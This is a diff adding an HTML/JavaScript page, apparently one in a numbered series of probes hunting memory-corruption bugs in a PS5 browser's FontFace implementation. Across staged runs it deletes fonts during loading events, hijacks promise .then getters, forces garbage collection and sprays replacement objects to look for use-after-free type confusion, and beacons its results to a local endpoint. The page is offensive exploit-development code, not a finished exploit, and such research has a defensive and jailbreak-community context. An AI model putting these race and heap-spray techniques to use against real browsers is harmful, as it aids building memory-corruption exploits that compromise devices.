@@ -1,0 +1,582 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1213 FontFace serif loading race</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#050508;color:#e8ffe8;font:14px/1.5 'Courier New',monospace;padding:12px}
+#hud{background:#0a0a18;border:2px solid #2a2a5a;border-radius:10px;padding:12px;margin-bottom:10px}
+#hud h1{color:#00ff88;font-size:18px;margin-bottom:6px}
+#status{font-size:20px;font-weight:bold;color:#ffd75e;padding:6px 0}
+#phase{font-size:16px;color:#00ffee}
+#counters{font-size:14px;color:#b9c6ee;line-height:1.8}
+#finds{font-size:14px;color:#ff55c8;line-height:1.7;white-space:pre-wrap;word-break:break-all}
+#log{background:#0a0a12;border:1px solid #22223a;border-radius:8px;padding:8px;margin-top:8px;
+max-height:50vh;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}
+.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}.hit{color:#ff00ff;font-weight:bold}
+</style>
+</head><body>
+<div id="hud">
+  <h1>P1213 — FONTFACE SERIF LOADING RACE + THEN HIJACK</h1>
+  <div id="status">BOOTING...</div>
+  <div id="phase">phase: init</div>
+  <div id="counters">...</div>
+  <div id="finds">no findings yet</div>
+</div>
+<div id="log"></div>
+<script>
+'use strict';
+var L=document.getElementById('log'),S=document.getElementById('status'),
+PH=document.getElementById('phase'),CT=document.getElementById('counters'),FD=document.getElementById('finds');
+var T0=Date.now();
+function setStatus(t){S.textContent=t;}
+function setPhase(t){PH.textContent='phase: '+t;}
+function setCounters(t){CT.textContent=t;}
+function addFind(t){var c=FD.textContent;FD.textContent=(c==='no findings yet'?'':c+'\n')+t;}
+function log(m,c){var d=document.createElement('div');d.className=c||'';
+d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
+function B(tag,data){try{var u='/beacon.php?tag=P1213-'+encodeURIComponent(tag);
+if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+u+='&t='+Date.now();new Image().src=u;}catch(e){}}
+window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};
+
+/* ═══════════════════════════════════════════════════════════════════════
+   P1213: FontFace with local(serif) — the ONLY source that loads on PS5
+
+   P1212 showed: local(serif) loads, all other sources fail.
+   But we NEVER tested loading events with the working source!
+
+   Stages:
+   0: local(serif) event profiling — does loading/loadingdone fire?
+   1: FontFaceSet.load() with local(serif) + deletion in loading event
+   2: .then getter hijack on .loaded promise
+   3: Rapid create-load-delete cycle with local(serif)
+   4: Same-type FontFace spray after GC (using the S5 finding: 30/30 collected)
+   5: FontFace descriptor property probing (featureSettings, display, etc)
+   6: CSSFontFace internal state after delete + reload
+   ═══════════════════════════════════════════════════════════════════════ */
+
+var STAGES=['serifEvents','loadDeleteSerif','thenHijack','rapidSerif','sameTypeSpray','descriptorProbe','stateAfterDelete'];
+var stage=0,results=[];
+try{stage=parseInt(localStorage.getItem('p1213_stage')||'0');}catch(e){}
+try{var r=localStorage.getItem('p1213_res');if(r)results=JSON.parse(r);}catch(e){}
+if(!Array.isArray(results))results=[];
+B('BOOT','stage='+stage+'|'+STAGES[stage]);
+setStatus('STAGE '+stage+'/'+STAGES.length+' — '+(STAGES[stage]||'DONE'));
+
+function done(rep){
+  results.push({stage:stage,name:STAGES[stage],result:rep});
+  try{localStorage.setItem('p1213_res',JSON.stringify(results));}catch(e){}
+  B('RESULT','s'+stage+'|'+rep.slice(0,700));
+  addFind('S'+stage+' '+STAGES[stage]+': '+rep.slice(0,200));
+  log('=== S'+stage+' -> '+rep+' ===','ok');
+  setTimeout(function(){location.reload();},1200);
+}
+
+if(stage>=STAGES.length){
+  setStatus('ALL STAGES COMPLETE');
+  var summary=JSON.stringify(results);
+  B('ALL-DONE',summary.slice(0,800));
+  log('ALL DONE','ok');log(summary,'info');
+  try{localStorage.removeItem('p1213_stage');localStorage.removeItem('p1213_res');}catch(e){}
+}else{
+
+try{localStorage.setItem('p1213_stage',''+(stage+1));}catch(e){}
+setPhase(STAGES[stage]);
+
+/* ─── STAGE 0: local(serif) event profiling ─── */
+if(stage===0)(function(){
+  log('S0: test if local(serif) fires loading/loadingdone events','info');
+
+  var events=[];
+  var ts=function(){return (Date.now()-T0).toFixed(1);};
+
+  document.fonts.addEventListener('loading',function(){events.push(ts()+'ms:LOADING');log('LOADING event!','hit');});
+  document.fonts.addEventListener('loadingdone',function(){events.push(ts()+'ms:LOADINGDONE');log('LOADINGDONE event!','hit');});
+  document.fonts.addEventListener('loadingerror',function(){events.push(ts()+'ms:LOADINGERROR');log('LOADINGERROR event!','err');});
+
+  var f1=new FontFace('seriftest1','local(serif)');
+  events.push('status0='+f1.status);
+
+  document.fonts.add(f1);
+  events.push('addedStatus='+f1.status+'|setSize='+document.fonts.size);
+
+  var loadProm=null;
+  try{
+    loadProm=f1.load();
+    events.push('loadCalled|status='+f1.status);
+  }catch(e){
+    events.push('loadThrew:'+e.message);
+  }
+
+  if(loadProm){
+    loadProm.then(function(v){
+      events.push('faceLoadResolved|status='+f1.status+'|type='+typeof v);
+      log('face.load() resolved, status='+f1.status,'ok');
+    }).catch(function(e){
+      events.push('faceLoadRejected:'+e.message);
+      log('face.load() rejected: '+e.message,'err');
+    });
+  }
+
+  var setLoadProm=null;
+  try{
+    setLoadProm=document.fonts.load('16px seriftest1');
+    events.push('fontsLoadCalled');
+  }catch(e){events.push('fontsLoadThrew:'+e.message);}
+
+  if(setLoadProm){
+    setLoadProm.then(function(arr){
+      events.push('fontsLoadResolved|count='+((arr&&arr.length)||0)+'|status='+f1.status);
+      log('document.fonts.load() resolved: '+((arr&&arr.length)||0)+' faces','ok');
+    }).catch(function(e){
+      events.push('fontsLoadRejected:'+e.message);
+    });
+  }
+
+  f1.loaded.then(function(v){
+    events.push('loadedPromResolved|status='+f1.status);
+  }).catch(function(e){
+    events.push('loadedPromRejected:'+e.message);
+  });
+
+  setTimeout(function(){
+    events.push('FINAL|status='+f1.status+'|setSize='+document.fonts.size);
+    done('SERIF-EVENTS|['+events.join('|')+']');
+  },3000);
+})();
+
+/* ─── STAGE 1: FontFaceSet.load() with deletion in loading event ─── */
+else if(stage===1)(function(){
+  log('S1: load() with local(serif) + delete in loading event','info');
+
+  var events=[];
+  var N=10;
+  var faces=[];
+  for(var i=0;i<N;i++){
+    var f=new FontFace('raceface'+i,'local(serif)');
+    faces.push(f);
+    document.fonts.add(f);
+  }
+  events.push('added='+faces.length+'|setSize='+document.fonts.size);
+
+  var loadingFired=false;
+  document.fonts.addEventListener('loading',function(){
+    loadingFired=true;
+    events.push('LOADING-EVENT|size='+document.fonts.size);
+    log('LOADING event — deleting faces NOW','hit');
+    for(var j=0;j<faces.length;j++){
+      try{
+        var r=document.fonts.delete(faces[j]);
+        if(j===0)events.push('delete0='+r);
+      }catch(e){events.push('delErr:'+e.message);}
+    }
+    events.push('afterDelete|size='+document.fonts.size);
+  });
+
+  document.fonts.addEventListener('loadingdone',function(){
+    events.push('LOADINGDONE|size='+document.fonts.size);
+  });
+
+  var fontsLoadDone=false;
+  try{
+    document.fonts.load('16px raceface0').then(function(arr){
+      fontsLoadDone=true;
+      events.push('load-resolved:'+((arr&&arr.length)||0)+'|loadingFired='+loadingFired);
+      log('load() resolved, loadingFired='+loadingFired,'ok');
+    }).catch(function(e){
+      fontsLoadDone=true;
+      events.push('load-rejected:'+e.message+'|loadingFired='+loadingFired);
+    });
+  }catch(e){events.push('load-threw:'+e.message);}
+
+  setTimeout(function(){
+    events.push('FINAL|loadingFired='+loadingFired+'|fontsLoadDone='+fontsLoadDone);
+    for(var k=0;k<Math.min(faces.length,3);k++){
+      events.push('face'+k+'status='+faces[k].status);
+    }
+    done('LOAD-DELETE-SERIF|['+events.join('|')+']');
+  },4000);
+})();
+
+/* ─── STAGE 2: .then getter hijack on .loaded promise ─── */
+else if(stage===2)(function(){
+  log('S2: hijack .then on .loaded promise','info');
+
+  var events=[];
+
+  var f=new FontFace('thenhijack','local(serif)');
+
+  var origThen=f.loaded.then;
+  var hijackCalled=false;
+  var resolveCapture=null;
+  var rejectCapture=null;
+
+  try{
+    Object.defineProperty(f.loaded,'then',{
+      get:function(){
+        hijackCalled=true;
+        events.push('THEN-GETTER-CALLED');
+        log('!!! .then getter accessed !!!','hit');
+        B('THEN-HIT','getter-accessed');
+        return function(res,rej){
+          resolveCapture=res;
+          rejectCapture=rej;
+          events.push('thenFunc|resType='+typeof res+'|rejType='+typeof rej);
+          return origThen.call(f.loaded,res,rej);
+        };
+      },
+      configurable:true
+    });
+    events.push('thenOverride=OK');
+  }catch(e){
+    events.push('thenOverride=FAIL:'+e.message);
+  }
+
+  document.fonts.add(f);
+  f.load().then(function(){
+    events.push('load-done|hijackCalled='+hijackCalled);
+  }).catch(function(e){
+    events.push('load-err:'+e.message);
+  });
+
+  var f2=new FontFace('thenhijack2','local(serif)');
+  var thennable={then:function(res,rej){
+    events.push('THENNABLE-CALLED');
+    log('!!! Thennable object called !!!','hit');
+    B('THENNABLE','called');
+    res(f2);
+  }};
+
+  try{
+    Promise.resolve(thennable).then(function(v){
+      events.push('thennableResolved|type='+typeof v);
+    });
+  }catch(e){events.push('thennableErr:'+e.message);}
+
+  var f3=new FontFace('thenhijack3','local(serif)');
+  document.fonts.add(f3);
+  var loadedProm=f3.loaded;
+  var origProto=Object.getPrototypeOf(loadedProm);
+  var thenHits=0;
+
+  try{
+    var customProto=Object.create(origProto);
+    Object.defineProperty(customProto,'then',{
+      value:function(res,rej){
+        thenHits++;
+        events.push('PROTO-THEN-HIT#'+thenHits);
+        log('!!! Proto .then hit #'+thenHits,'hit');
+        return origProto.then.call(this,res,rej);
+      },
+      writable:true,configurable:true
+    });
+    Object.setPrototypeOf(loadedProm,customProto);
+    events.push('protoOverride=OK');
+  }catch(e){
+    events.push('protoOverride=FAIL:'+e.message);
+  }
+
+  f3.load().catch(function(){});
+
+  setTimeout(function(){
+    events.push('FINAL|hijackCalled='+hijackCalled+'|thenHits='+thenHits+
+                '|resolveCapture='+(typeof resolveCapture)+'|rejectCapture='+(typeof rejectCapture));
+    done('THEN-HIJACK|['+events.join('|')+']');
+  },3000);
+})();
+
+/* ─── STAGE 3: Rapid create-load-delete with local(serif) ─── */
+else if(stage===3)(function(){
+  log('S3: rapid create-load-delete cycles with local(serif)','info');
+
+  var ITERS=50;
+  var events=[];
+  var anomalies=0;
+  var loadingEvents=0;
+  var loadingDoneEvents=0;
+
+  document.fonts.addEventListener('loading',function(){loadingEvents++;});
+  document.fonts.addEventListener('loadingdone',function(){loadingDoneEvents++;});
+
+  var iter=0;
+  function cycle(){
+    if(iter>=ITERS){
+      events.push('loadingEvents='+loadingEvents+'|loadingDoneEvents='+loadingDoneEvents);
+      done('RAPID-SERIF|iters='+ITERS+'|anomalies='+anomalies+
+           '|loadingEvts='+loadingEvents+'|loadingDoneEvts='+loadingDoneEvents+
+           '|events=['+events.slice(-8).join('|')+']');
+      return;
+    }
+    setCounters('cycle '+iter+'/'+ITERS+' anom='+anomalies+' loadEvts='+loadingEvents);
+
+    var f=new FontFace('rapid'+iter,'local(serif)');
+    document.fonts.add(f);
+    var statusBefore=f.status;
+    var sizeBefore=document.fonts.size;
+
+    document.fonts.load('16px rapid'+iter).then(function(arr){
+      var count=arr?arr.length:0;
+      var statusAfter=f.status;
+
+      var deleted=document.fonts.delete(f);
+      var sizeAfter=document.fonts.size;
+
+      if(count>0||statusAfter==='loaded'){
+        events.push('i'+iter+':ok|count='+count+'|stat='+statusAfter+'|del='+deleted);
+      }
+      if(count>1){
+        anomalies++;
+        events.push('i'+iter+':ANOMALY-count='+count);
+        log('ANOMALY: '+count+' faces returned for single add!','hit');
+        B('ANOMALY','iter='+iter+'|count='+count);
+      }
+      if(statusAfter!=='loaded'&&statusAfter!=='error'){
+        anomalies++;
+        events.push('i'+iter+':ANOMALY-status='+statusAfter);
+        log('ANOMALY status: '+statusAfter,'hit');
+      }
+
+      iter++;
+      setTimeout(cycle,20);
+    }).catch(function(e){
+      events.push('i'+iter+':rejected:'+e.message.slice(0,40));
+      document.fonts.delete(f);
+      iter++;
+      setTimeout(cycle,20);
+    });
+
+    setTimeout(function(){
+      if(iter===arguments.callee)return;
+    },3000);
+  }
+  cycle();
+})();
+
+/* ─── STAGE 4: Same-type FontFace spray after GC ─── */
+else if(stage===4)(function(){
+  log('S4: GC FontFaces (no promise), spray same-type replacements','info');
+
+  if(typeof FinalizationRegistry!=='function'){done('SAME-TYPE|NO-FinReg');return;}
+
+  var collected=0;
+  var N=50;
+  var fr=new FinalizationRegistry(function(id){collected++;});
+
+  for(var i=0;i<N;i++){
+    (function(idx){
+      var f=new FontFace('gcface'+idx,'local(serif)');
+      document.fonts.add(f);
+      fr.register(f,'gc_'+idx);
+      document.fonts.delete(f);
+    })(i);
+  }
+  log('created+deleted '+N+' faces, waiting for GC','info');
+
+  function pressure(){var a=[];for(var j=0;j<8000;j++)a.push({x:j,y:new ArrayBuffer(64)});a=null;}
+
+  var rounds=0;
+  function gcAndSpray(){
+    if(collected>=N*0.5||rounds>=30){
+      log('GC done: '+collected+'/'+N+' in '+rounds+' rounds','ok');
+
+      var replacements=[];
+      for(var k=0;k<N*2;k++){
+        var r=new FontFace('replace'+k,'local(serif)');
+        document.fonts.add(r);
+        replacements.push(r);
+      }
+      log('sprayed '+replacements.length+' same-type FontFaces','warn');
+
+      var anomalies=0;
+      var details=[];
+      for(var s=0;s<replacements.length;s++){
+        try{
+          var fam=replacements[s].family;
+          var stat=replacements[s].status;
+          var feat=replacements[s].featureSettings;
+          if(fam!=='replace'+s){
+            anomalies++;
+            details.push('s'+s+':fam='+fam+'(expected replace'+s+')');
+            log('!!! FAMILY MISMATCH: '+fam+' at idx '+s,'hit');
+            B('ANOMALY','fam='+fam+'|idx='+s);
+          }
+          if(feat&&feat!=='normal'){
+            anomalies++;
+            details.push('s'+s+':feat='+feat);
+            log('!!! FEATURE SETTINGS: '+feat+' at idx '+s,'hit');
+          }
+        }catch(e){
+          anomalies++;
+          details.push('s'+s+':threw:'+e.message.slice(0,30));
+          log('!!! THREW reading replacement '+s+': '+e.message,'hit');
+          B('THREW','s='+s+'|e='+e.message.slice(0,50));
+        }
+      }
+
+      for(var c=0;c<replacements.length;c++){
+        try{document.fonts.delete(replacements[c]);}catch(e){}
+      }
+
+      done('SAME-TYPE|collected='+collected+'/'+N+'|rounds='+rounds+
+           '|sprayed='+replacements.length+'|anomalies='+anomalies+
+           '|details=['+details.slice(0,10).join(',')+']');
+      return;
+    }
+    pressure();rounds++;
+    setCounters('GC '+rounds+'/30 collected='+collected+'/'+N);
+    setTimeout(gcAndSpray,120);
+  }
+  gcAndSpray();
+})();
+
+/* ─── STAGE 5: FontFace descriptor property probing ─── */
+else if(stage===5)(function(){
+  log('S5: probe all FontFace descriptors','info');
+
+  var f=new FontFace('desctest','local(serif)');
+  var props={};
+
+  var descriptors=['family','style','weight','stretch','unicodeRange','variant',
+                   'featureSettings','display','lineGapOverride','ascentOverride',
+                   'descentOverride','sizeAdjust'];
+
+  for(var i=0;i<descriptors.length;i++){
+    var name=descriptors[i];
+    try{
+      var val=f[name];
+      props[name]={get:String(val),type:typeof val};
+
+      var testVals={
+        'family':'"newname"',
+        'style':'italic',
+        'weight':'bold',
+        'stretch':'condensed',
+        'unicodeRange':'U+0-FF',
+        'variant':'small-caps',
+        'featureSettings':'"liga" 1',
+        'display':'swap',
+        'lineGapOverride':'10%',
+        'ascentOverride':'80%',
+        'descentOverride':'20%',
+        'sizeAdjust':'90%'
+      };
+
+      if(testVals[name]){
+        try{
+          f[name]=testVals[name];
+          var after=f[name];
+          props[name].set=true;
+          props[name].after=String(after);
+          props[name].changed=(String(val)!==String(after));
+          log(name+': '+val+' -> '+after+(props[name].changed?' CHANGED':' same'),'info');
+        }catch(e){
+          props[name].set=false;
+          props[name].setErr=e.message;
+          log(name+': set failed: '+e.message,'warn');
+        }
+      }
+    }catch(e){
+      props[name]={get:'ERROR',err:e.message};
+      log(name+': get failed: '+e.message,'err');
+    }
+  }
+
+  var sizes={};
+  try{
+    var before=performance.now();
+    for(var j=0;j<100;j++){
+      var tmp=new FontFace('sizetest'+j,'local(serif)');
+      tmp.featureSettings='"liga" 1, "kern" 1, "calt" 1, "smcp" 1';
+    }
+    sizes.featureAlloc=(performance.now()-before).toFixed(2)+'ms/100';
+  }catch(e){sizes.featureAlloc='error:'+e.message;}
+
+  try{
+    var before2=performance.now();
+    for(var j2=0;j2<100;j2++){
+      var tmp2=new FontFace('sizetest2_'+j2,'local(serif)');
+    }
+    sizes.plainAlloc=(performance.now()-before2).toFixed(2)+'ms/100';
+  }catch(e){sizes.plainAlloc='error:'+e.message;}
+
+  done('DESCRIPTORS|'+JSON.stringify({props:props,sizes:sizes}));
+})();
+
+/* ─── STAGE 6: CSSFontFace state after delete + reload ─── */
+else if(stage===6)(function(){
+  log('S6: CSSFontFace internal state probing after delete+re-add','info');
+
+  var events=[];
+
+  var f=new FontFace('statetest','local(serif)');
+  document.fonts.add(f);
+
+  f.load().then(function(){
+    events.push('loaded|status='+f.status);
+
+    var family1=f.family;
+    var feat1=f.featureSettings;
+    var style1=f.style;
+
+    document.fonts.delete(f);
+    events.push('deleted|status='+f.status+'|family='+f.family);
+
+    try{f.featureSettings='"liga" 1';}catch(e){events.push('setFeatErr:'+e.message);}
+    events.push('afterFeatSet|feat='+f.featureSettings);
+
+    document.fonts.add(f);
+    events.push('re-added|setSize='+document.fonts.size+'|status='+f.status);
+
+    f.load().then(function(){
+      events.push('reloaded|status='+f.status+'|feat='+f.featureSettings);
+
+      document.fonts.delete(f);
+      document.fonts.add(f);
+      document.fonts.delete(f);
+      document.fonts.add(f);
+      events.push('toggle-4x|status='+f.status+'|size='+document.fonts.size);
+
+      var stale=f.loaded;
+      document.fonts.delete(f);
+
+      try{f.family='OVERWRITTEN';}catch(e){events.push('famSetErr:'+e.message);}
+      events.push('afterFamSet|family='+f.family);
+
+      stale.then(function(v){
+        events.push('staleResolved|type='+typeof v+'|fam='+(v&&v.family));
+        done('STATE-PROBE|['+events.join('|')+']');
+      }).catch(function(e){
+        events.push('staleRejected:'+e.message);
+        done('STATE-PROBE|['+events.join('|')+']');
+      });
+    }).catch(function(e){
+      events.push('reload-err:'+e.message);
+      done('STATE-PROBE|['+events.join('|')+']');
+    });
+  }).catch(function(e){
+    events.push('load-err:'+e.message);
+    done('STATE-PROBE|['+events.join('|')+']');
+  });
+
+  setTimeout(function(){
+    events.push('TIMEOUT');
+    done('STATE-PROBE|['+events.join('|')+']');
+  },8000);
+})();
+
+} /* end else */
+
+/* ─── Reload poller ─── */
+var _rl='',_rp=0;
+function checkReload(){
+  if(_rp>300)return;_rp++;
+  var x=new XMLHttpRequest();
+  x.open('GET','/reload.txt?_='+Date.now(),true);x.timeout=3000;
+  x.onload=function(){var t=(x.responseText||'').trim();
+  if(_rl&&t!==_rl){setTimeout(function(){location.reload();},500);return;}_rl=t;};
+  try{x.send();}catch(e){}setTimeout(checkReload,3000);
+}
+setTimeout(checkReload,2000);
+</script>
+</body></html>
